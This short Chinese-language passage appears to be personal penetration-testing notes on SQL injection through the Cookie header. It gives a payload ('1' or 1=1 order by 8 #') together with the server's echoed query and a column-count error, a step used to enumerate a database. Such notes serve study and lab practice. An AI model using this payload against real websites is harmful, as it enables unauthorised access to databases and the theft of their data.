## Cookie头注入
响应包中明显使用到cookie场景，可以考虑
![](pic/Pasted%20image%2020260914222507.png)
```
1' or 1=1 order by 8 #
执行SQL语句：SELECT * FROM users WHERE cookie='1' or 1=1 order by 8 #'<br />Unknown
column '8' in 'order clause'
```
